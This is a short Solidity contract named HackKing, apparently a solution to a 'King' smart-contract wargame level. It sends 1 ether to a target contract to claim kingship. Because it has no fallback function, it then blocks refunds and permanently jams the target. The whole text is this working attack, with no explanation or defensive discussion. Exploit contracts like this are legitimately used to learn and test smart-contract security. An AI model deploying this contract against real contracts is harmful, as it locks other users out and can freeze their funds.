pragma solidity ^0.5.0;

contract HackKing {
    address payable public kingAddr;
    
    constructor(address payable _kingAddr) public payable {
        kingAddr = _kingAddr;
    }
    
    function hack() public {
        kingAddr.call.gas(1000000).value(1 ether)("");
    }
}